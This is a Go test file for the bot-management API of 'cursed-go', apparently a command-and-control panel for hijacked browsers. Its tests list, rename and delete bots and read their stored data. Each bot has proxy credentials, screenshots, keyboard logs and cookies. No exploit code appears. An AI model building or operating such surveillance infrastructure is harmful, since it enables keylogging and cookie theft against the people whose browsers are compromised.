package api

import (
	"bytes"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"testing"
	"time"

	"github.com/google/uuid"
	"gorm.io/driver/sqlite"
	"gorm.io/gorm"

	"github.com/s045pd/cursed-go/internal/db/models"
)

func setupBotsAPI(t *testing.T) (*BotsAPI, *gorm.DB) {
	t.Helper()
	g, err := gorm.Open(sqlite.Open(":memory:"), &gorm.Config{})
	if err != nil {
		t.Fatal(err)
	}
	if err := g.AutoMigrate(models.All()...); err != nil {
		t.Fatal(err)
	}
	return &BotsAPI{DB: g}, g
}

func seedBot(t *testing.T, gdb *gorm.DB, name string) models.Bot {
	t.Helper()
	b := models.Bot{
		BrowserID:     uuid.New().String(),
		Name:          name,
		ProxyUsername: name + "_" + uuid.New().String()[:8],
		ProxyPassword: "p",
		IsOnline:      true,
		LastOnline:    time.Now(),
	}
	if err := gdb.Create(&b).Error; err != nil {
		t.Fatal(err)
	}
	return b
}

func TestBots_List_PaginationAndFilter(t *testing.T) {
	a, gdb := setupBotsAPI(t)
	for i := 0; i < 12; i++ {
		seedBot(t, gdb, "bot")
	}
	seedBot(t, gdb, "alpha")

	r := httptest.NewRequest(http.MethodGet, "/api/v1/bots?page=1&limit=5", nil)
	rr := httptest.NewRecorder()
	a.List(rr, r)
	if rr.Code != http.StatusOK {
		t.Fatalf("status=%d", rr.Code)
	}
	var resp envelope
	if err := json.Unmarshal(rr.Body.Bytes(), &resp); err != nil {
		t.Fatal(err)
	}
	res := resp.Result.(map[string]any)
	if got := len(res["bots"].([]any)); got != 5 {
		t.Errorf("page size = %d, want 5", got)
	}
	pag := res["pagination"].(map[string]any)
	if pag["total"].(float64) != 13 {
		t.Errorf("total = %v, want 13", pag["total"])
	}

	// filter by name
	r2 := httptest.NewRequest(http.MethodGet, "/api/v1/bots?name=alpha", nil)
	rr2 := httptest.NewRecorder()
	a.List(rr2, r2)
	var resp2 envelope
	_ = json.Unmarshal(rr2.Body.Bytes(), &resp2)
	res2 := resp2.Result.(map[string]any)
	if got := len(res2["bots"].([]any)); got != 1 {
		t.Errorf("name filter returned %d bots, want 1", got)
	}
}

func TestBots_Update(t *testing.T) {
	a, gdb := setupBotsAPI(t)
	b := seedBot(t, gdb, "before")

	newName := "after"
	body, _ := json.Marshal(updateBotReq{BotID: b.ID.String(), Name: &newName})
	r := httptest.NewRequest(http.MethodPut, "/api/v1/bots", bytes.NewReader(body))
	rr := httptest.NewRecorder()
	a.Update(rr, r)
	if rr.Code != http.StatusOK {
		t.Fatalf("status=%d body=%s", rr.Code, rr.Body.String())
	}

	var got models.Bot
	gdb.Where("id = ?", b.ID).First(&got)
	if got.Name != "after" {
		t.Errorf("name = %s, want after", got.Name)
	}
}

func TestBots_Update_BotNotFound(t *testing.T) {
	a, _ := setupBotsAPI(t)
	newName := "x"
	body, _ := json.Marshal(updateBotReq{BotID: uuid.New().String(), Name: &newName})
	r := httptest.NewRequest(http.MethodPut, "/api/v1/bots", bytes.NewReader(body))
	rr := httptest.NewRecorder()
	a.Update(rr, r)
	if rr.Code != http.StatusNotFound {
		t.Errorf("status=%d, want 404", rr.Code)
	}
}

func TestBots_Delete_Cascade(t *testing.T) {
	a, gdb := setupBotsAPI(t)
	b := seedBot(t, gdb, "x")

	// add child rows
	gdb.Create(&models.BotScreenshot{BotID: b.ID, ImageData: "data", Timestamp: time.Now()})
	gdb.Create(&models.BotKeyboardLog{BotID: b.ID, Keys: "abc", Timestamp: time.Now()})

	body, _ := json.Marshal(deleteBotReq{BotID: b.ID.String()})
	r := httptest.NewRequest(http.MethodDelete, "/api/v1/bots", bytes.NewReader(body))
	rr := httptest.NewRecorder()
	a.Delete(rr, r)
	if rr.Code != http.StatusOK {
		t.Fatalf("status=%d", rr.Code)
	}
	var n int64
	gdb.Model(&models.BotScreenshot{}).Where("bot_id=?", b.ID).Count(&n)
	if n != 0 {
		t.Errorf("screenshots not cascaded: %d remain", n)
	}
}

func TestBots_BatchDelete(t *testing.T) {
	a, gdb := setupBotsAPI(t)
	b1 := seedBot(t, gdb, "b1")
	b2 := seedBot(t, gdb, "b2")

	body, _ := json.Marshal(batchDeleteReq{BotIDs: []string{b1.ID.String(), b2.ID.String()}})
	r := httptest.NewRequest(http.MethodPost, "/api/v1/bots/batch-delete", bytes.NewReader(body))
	rr := httptest.NewRecorder()
	a.BatchDelete(rr, r)
	if rr.Code != http.StatusOK {
		t.Fatalf("status=%d", rr.Code)
	}
	var n int64
	gdb.Model(&models.Bot{}).Count(&n)
	if n != 0 {
		t.Errorf("bots remain: %d", n)
	}
}

func TestBots_Image(t *testing.T) {
	a, gdb := setupBotsAPI(t)
	b := seedBot(t, gdb, "b1")
	gdb.Model(&b).Update("current_tab_image", "fakeimg")

	r := httptest.NewRequest(http.MethodGet, "/api/v1/bots/image/"+b.ID.String(), nil)
	// chi URL param substitution
	rctx := chiRouteCtx("bot_id", b.ID.String())
	r = r.WithContext(rctx)
	rr := httptest.NewRecorder()
	a.Image(rr, r)
	if rr.Code != http.StatusOK {
		t.Fatalf("status=%d", rr.Code)
	}
	if rr.Body.String() != "fakeimg" {
		t.Errorf("body=%s", rr.Body.String())
	}
}

func TestBots_Field_AllowedAndDenied(t *testing.T) {
	a, gdb := setupBotsAPI(t)
	b := seedBot(t, gdb, "b1")

	r := httptest.NewRequest(http.MethodGet, "/api/v1/fields?field=cookies&id="+b.ID.String(), nil)
	rr := httptest.NewRecorder()
	a.Field(rr, r)
	if rr.Code != http.StatusOK {
		t.Errorf("allowed field returned %d", rr.Code)
	}

	r2 := httptest.NewRequest(http.MethodGet, "/api/v1/fields?field=password&id="+b.ID.String(), nil)
	rr2 := httptest.NewRecorder()
	a.Field(rr2, r2)
	if rr2.Code != http.StatusBadRequest {
		t.Errorf("disallowed field accepted: %d", rr2.Code)
	}
}
